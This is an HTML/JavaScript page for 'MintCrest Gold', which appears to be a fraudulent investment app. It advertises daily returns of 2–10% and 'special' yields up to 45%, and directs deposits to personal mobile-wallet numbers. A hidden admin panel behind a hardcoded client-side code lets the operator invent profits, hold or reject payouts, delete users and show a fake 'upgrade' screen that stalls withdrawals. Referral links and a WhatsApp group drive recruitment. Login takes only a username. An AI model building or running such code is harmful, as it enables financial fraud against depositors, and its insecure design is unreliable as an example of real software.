<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(35px); border: 1px solid rgba(255,255,255,0.06); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .plan-card { position: relative; overflow: hidden; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.05); }
        .plan-card:active { transform: scale(0.97); }
        .special-plan { background: linear-gradient(145deg, #1e1b4b, #312e81); border: 1px solid #4f46e5; box-shadow: 0 0 20px rgba(79, 70, 229, 0.2); }
        .timer-glow { animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
        #maint-overlay { display: none; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="maint-overlay" class="fixed inset-0 z-[10000] bg-black flex flex-col items-center justify-center p-10 text-center">
        <div class="text-6xl mb-6">⚙️</div>
        <h2 class="text-2xl font-black uppercase tracking-tighter">System Upgrade</h2>
        <p class="text-gray-400 text-[10px] mt-2 font-bold uppercase tracking-widest">Optimizing nodes for faster payouts. Back shortly!</p>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-1 uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-600 text-[8px] uppercase tracking-[0.5em] mb-10 font-black">Institutional Grade Assets</p>
            <div class="glass p-10 rounded-[3rem]">
                <input type="text" id="user-name" placeholder="Username" class="w-full bg-white/5 p-5 rounded-2xl border border-white/5 outline-none text-center font-bold mb-4 focus:border-blue-500 text-sm">
                <input type="text" id="ref-by" placeholder="Invite ID (Optional)" class="w-full bg-white/5 p-4 rounded-xl border border-white/5 outline-none text-center text-[10px] mb-8 font-bold opacity-40">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest active:scale-95 shadow-2xl">Initialize Secure Link</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-8 pb-4 flex justify-between items-start">
            <div>
                <h1 class="text-2xl font-black tracking-tighter" id="welcome-msg">Welcome Back! 👋</h1>
                <p class="text-[9px] font-black text-blue-500 uppercase tracking-widest">Secure Node: Active</p>
            </div>
            <div class="flex gap-2">
                <button onclick="changePage('promo')" class="glass p-2 rounded-xl text-lg">🎟️</button>
                <button onclick="window.open('https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3')" class="glass p-2 rounded-xl text-lg">💬</button>
            </div>
        </div>

        <div id="user-alert" class="hidden mx-6 p-4 glass rounded-2xl border-l-4 border-blue-500 mb-4">
            <p id="alert-text" class="text-[10px] font-bold text-gray-300 italic"></p>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-8 rounded-[2.5rem] mb-6 relative overflow-hidden bg-gradient-to-br from-blue-900/20 to-transparent">
                <p class="text-[9px] text-blue-400 font-black uppercase tracking-widest mb-1">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                
                <div id="active-timer-box" class="hidden mt-6 bg-white/5 p-3 rounded-2xl border border-white/5">
                    <p class="text-[7px] text-gray-400 uppercase font-black">Next Profit Injection In:</p>
                    <span id="countdown-display" class="text-xs font-black text-blue-400 timer-glow tracking-widest">00:00:00</span>
                </div>

                <div class="mt-8 grid grid-cols-2 gap-3">
                    <div class="bg-white/5 p-4 rounded-2xl">
                        <p class="text-[7px] text-gray-500 uppercase font-black">Total Yield</p>
                        <span id="v-profit" class="text-xs font-bold text-green-400">₨ 0</span>
                    </div>
                    <div class="bg-white/5 p-4 rounded-2xl">
                        <p class="text-[7px] text-gray-500 uppercase font-black">Plan Status</p>
                        <span id="tier-tag" class="text-[9px] font-black text-blue-400 uppercase italic">Idle</span>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center active:scale-95 border-b-2 border-blue-500/50">
                    <span class="text-2xl mb-2">💎</span>
                    <span class="text-[9px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] flex flex-col items-center active:scale-95 border-b-2 border-red-500/50">
                    <span class="text-2xl mb-2">🚀</span>
                    <span class="text-[9px] font-black uppercase tracking-widest">Payout</span>
                </button>
            </div>
        </div>

        <div id="p-invest" class="page p-6 pb-20">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-500 text-xl tracking-tighter">Investment Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-gray-500 tracking-widest">Transaction Ledger</h2>
            <div id="user-history" class="space-y-2"></div>
        </div>

        <div id="p-promo" class="page p-6">
            <div class="glass p-10 rounded-[3rem] text-center">
                <h2 class="text-xl font-black italic mb-6">REDEEM PROMO</h2>
                <input type="text" id="promo-code" placeholder="ENTER CODE" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-black mb-6 uppercase tracking-widest">
                <button onclick="applyPromo()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase">Verify Code</button>
            </div>
        </div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-8 rounded-[2.5rem] border-t-2 border-blue-600 text-center">
                <p class="text-[9px] font-black text-blue-500 uppercase italic mb-3">Your Referral Link</p>
                <div id="ref-link-display" class="text-[10px] font-bold opacity-50 mb-4 truncate px-4 bg-white/5 py-2 rounded-lg">---</div>
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-xl font-black text-[9px] uppercase tracking-widest">Copy Link</button>
            </div>
            
            <div class="grid grid-cols-1 gap-2">
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="glass p-6 rounded-[2rem] flex justify-between items-center px-8 border-l-4 border-green-500">
                    <span class="text-[10px] font-black uppercase tracking-widest text-green-400">Official WhatsApp Group</span>
                    <span>↗️</span>
                </a>
                <button onclick="changePage('help')" class="glass p-6 rounded-[2rem] flex justify-between items-center px-8 border-l-4 border-blue-500 text-[10px] font-black uppercase tracking-widest">
                    <span>Help Desk & Support</span>
                    <span>🎧</span>
                </button>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2rem] text-[9px] font-black text-red-500 uppercase tracking-widest mt-10">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3rem] border-t-8 border-blue-600">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm text-center">Capital Deposit</h3>
                <div class="space-y-2 mb-10 text-[9px] font-black">
                    <div class="glass p-4 rounded-xl flex justify-between"><span>JazzCash/SadaPay</span><span class="text-blue-400">03705519562</span></div>
                    <div class="glass p-4 rounded-xl flex justify-between"><span>EasyPaisa</span><span class="text-green-400">03379827882</span></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-black outline-none border border-white/5">
                <input type="text" id="dep-trx" placeholder="Transaction ID" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center font-black uppercase outline-none border border-white/5">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest">Verify Funds</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3rem] border-t-8 border-red-600">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm text-center">Fund Extraction</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-black outline-none border border-white/5">
                <input type="text" id="wd-acc" placeholder="Account Details" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center font-bold outline-none border border-white/5">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[11px] uppercase tracking-widest">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8">
            <h2 class="text-xl font-black text-blue-500 italic uppercase">ADMIN COMMAND HUB</h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-4 py-2 rounded-xl text-[9px] font-black uppercase">Exit</button>
        </div>

        <div class="grid grid-cols-2 gap-2 mb-6">
            <div class="glass p-4 rounded-2xl text-center">
                <p class="text-[7px] text-gray-500 uppercase font-black">Maint. Mode</p>
                <button onclick="toggleMaint()" id="adm-maint-btn" class="text-[10px] font-black text-red-500">OFF</button>
            </div>
            <div class="glass p-4 rounded-2xl text-center">
                <p class="text-[7px] text-gray-500 uppercase font-black">Total Users</p>
                <span id="adm-user-count" class="text-lg font-black">0</span>
            </div>
        </div>

        <div class="glass p-6 rounded-3xl mb-6">
            <input type="text" id="adm-u-search" oninput="adminUserSearch()" placeholder="Find User..." class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-black outline-none border border-white/10">
            <div id="adm-user-list" class="space-y-2 max-h-60 overflow-y-auto pr-2"></div>
        </div>

        <div class="glass p-6 rounded-3xl mb-6">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-40">Direct Control</h3>
            <input type="text" id="adm-u-target" placeholder="Username" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-[10px] font-black outline-none border border-white/5">
            <input type="number" id="adm-val" placeholder="Value" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-[10px] font-black outline-none border border-white/5">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualMod('balance')" class="bg-blue-600 py-3 rounded-xl text-[9px] font-black uppercase">Add Bal</button>
                <button onclick="manualMod('profit')" class="bg-green-600 py-3 rounded-xl text-[9px] font-black uppercase">Add Profit</button>
                <button onclick="manualMod('alert')" class="col-span-2 bg-yellow-600 py-3 rounded-xl text-[9px] font-black uppercase mt-2">Send Msg (use Value field)</button>
            </div>
        </div>

        <div id="adm-requests" class="space-y-4"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[3rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab"><span class="text-2xl">🏠</span><span class="text-[8px] font-black uppercase">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2"><span class="text-2xl">📈</span><span class="text-[8px] font-black uppercase">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2"><span class="text-2xl">📜</span><span class="text-[8px] font-black uppercase">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2"><span class="text-2xl">⚙️</span><span class="text-[8px] font-black uppercase">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0; let mStatus = false;

        const plans = [
            {n:"Trial Node", p:100, r:2, d:30}, {n:"Micro I", p:200, r:3, d:30}, {n:"Micro II", p:500, r:3.2, d:30},
            {n:"Bronze", p:1000, r:3.5, d:30}, {n:"Silver", p:2500, r:4, d:30}, {n:"Gold", p:5000, r:4.5, d:30},
            {n:"Platinum", p:7500, r:5, d:30}, {n:"Diamond", p:10000, r:5.5, d:30}, {n:"Titanium", p:15000, r:6, d:30},
            {n:"Elite", p:20000, r:7, d:30}, {n:"Master", p:30000, r:8, d:30}, {n:"VIP Grand", p:50000, r:10, d:30},
            {n:"⚡ FLASH 24H", p:500, r:15, s:true}, {n:"🚀 ROCKET", p:12000, r:20, s:true}, {n:"👑 CROWN", p:25000, r:25, s:true},
            {n:"🔥 NOVA", p:2000, r:18, s:true}, {n:"🌌 GALAXY", p:100000, r:35, s:true}, {n:"🦅 HAWK", p:3500, r:12, d:30},
            {n:"🧿 ORACLE", p:8000, r:14, d:30}, {n:"🔱 ZEUS", p:150000, r:45, s:true}
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Idle", alert: "", referredBy: document.getElementById('ref-by').value.trim() || "Direct" });
            document.getElementById('welcome-msg').innerText = `Welcome Back, ${name} 👋`;
            document.getElementById('ref-link-display').innerText = window.location.origin + window.location.pathname + "?ref=" + name;
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); 
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString(); 
                    document.getElementById('tier-tag').innerText = user.tierName;
                    if(user.alert) { document.getElementById('user-alert').classList.remove('hidden'); document.getElementById('alert-text').innerText = user.alert; }
                    if(user.activeTier > 0) document.getElementById('active-timer-box').classList.remove('hidden');
                } 
            });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="text-blue-500">${d.status}</span></div></div>`; });
            });
            setInterval(updateCountdown, 1000);
        }

        function updateCountdown() {
            if (user && user.activeTier > 0) {
                const next = (user.lastReqTime || Date.now()) + 86400000;
                const diff = next - Date.now();
                if(diff > 0) {
                    const h = Math.floor(diff/3600000); const m = Math.floor((diff%3600000)/60000); const s = Math.floor((diff%60000)/1000);
                    document.getElementById('countdown-display').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
                } else {
                    document.getElementById('countdown-display').innerText = "READY FOR YIELD";
                }
            }
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const isS = p.s === true;
                const body = isS ? `<p class="text-[9px] text-indigo-400 font-bold uppercase mt-1">Special Yield: ${p.r}% Total</p>` : 
                                  `<p class="text-[9px] text-green-400 font-bold uppercase">${p.r}% Daily Profit</p><p class="text-[7px] text-gray-500 font-bold mt-1">⏳ ${p.d} Days Contract</p>`;
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass ${isS?'special-plan':''} p-6 rounded-[2rem] flex justify-between items-center cursor-pointer active:scale-95 transition-all mb-1">
                    <div><h4 class="font-black text-[11px] uppercase">${p.n}</h4>${body}</div>
                    <div class="text-right"><p class="font-black text-[13px]">₨ ${p.p.toLocaleString()}</p></div>
                </div>`;
            });
        }

        async function buy(p, roi, t) {
            if(user.balance < p) return alert("Insufficient Capital!");
            if(confirm("Establish Link with "+t+"?")) {
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: t, lastReqTime: Date.now() });
                alert("Protocol Established!"); changePage('activity');
            }
        }

        async function applyPromo() {
            const code = document.getElementById('promo-code').value.trim().toUpperCase();
            if(!code) return;
            await db.collection("requests").add({ user: user.name, type: "Promo Request ("+code+")", amount: 0, status: "pending", time: Date.now() });
            alert("Promo submitted for verification!"); changePage('activity');
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value;
            if(!a || !t) return alert("Fill all fields!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "deposit", status: "pending", time: Date.now() });
            alert("Deposit Logged!"); changePage('activity');
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value;
            if(!a || !acc || parseInt(a) > user.balance) return alert("Check Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Withdrawal Authorized!"); changePage('activity');
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw'&&p!=='promo') document.getElementById('n-'+p).classList.add('active-tab'); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function copyRef() { const link = document.getElementById('ref-link-display').innerText; navigator.clipboard.writeText(link); alert("Link Copied!"); }

        // --- ADMIN CORE ---
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Command Code:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function syncAdmin() {
            db.collection("users").onSnapshot(snap => { 
                document.getElementById('adm-user-count').innerText = snap.size; 
                const list = document.getElementById('adm-user-list'); list.innerHTML = '';
                snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-3 rounded-xl flex justify-between items-center text-[9px] font-black uppercase adm-u-card" data-name="${u.name}"><span>${u.name} (Bal: ${u.balance})</span><button onclick="delUser('${u.name}')" class="text-red-500">DEL</button></div>`; });
            });
            db.collection("requests").where("status","==","pending").onSnapshot(snap => {
                const list = document.getElementById('adm-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[9px] font-black uppercase"><div>${d.user}<br>₨ ${d.amount} (${d.type})</div><div class="flex gap-2"><button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">OK</button><button onclick="handle('${doc.id}','${d.user}',${d.amount},'rejected','${d.type}')" class="bg-red-500 px-3 py-1 rounded">NO</button></div></div>`; });
            });
        }
        async function manualMod(field) {
            const u = document.getElementById('adm-u-target').value; const val = document.getElementById('adm-val').value;
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(field === 'alert') await ref.update({ alert: val });
            else if(doc.exists) await ref.update({ [field]: (doc.data()[field]||0) + parseInt(val) });
            alert("Command Executed!");
        }
        async function handle(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const doc = await ref.get();
            if(act === 'approved') {
                if(type.includes('Promo')) { const b = prompt("Enter Bonus for "+u); if(b) await ref.update({ balance: (doc.data().balance||0) + parseInt(b) }); }
                else if(type === 'deposit') await ref.update({ balance: (doc.data().balance||0) + amt });
            } else if(act === 'rejected' && type === 'withdraw') { await ref.update({ balance: (doc.data().balance||0) + amt }); }
            await db.collection("requests").doc(id).update({ status: act });
        }
        async function delUser(n) { if(confirm("Delete user "+n+"?")) await db.collection("users").doc(n).delete(); }
        function adminUserSearch() { const q = document.getElementById('adm-u-search').value.toLowerCase(); document.querySelectorAll('.adm-u-card').forEach(c => c.style.display = c.dataset.name.toLowerCase().includes(q)?'flex':'none'); }
        async function toggleMaint() { mStatus = !mStatus; await db.collection("app_data").doc("maint").set({ active: mStatus }); document.getElementById('adm-maint-btn').innerText = mStatus ? "ON" : "OFF"; }
        
        db.collection("app_data").doc("maint").onSnapshot(doc => { 
            if(doc.exists && doc.data().active) document.getElementById('maint-overlay').style.display = 'flex';
            else document.getElementById('maint-overlay').style.display = 'none';
        });

        window.onload = () => { const s = localStorage.getItem('mc_user'); if(s) { document.getElementById('user-name').value = s; login(); } };
    </script>
</body>
</html>
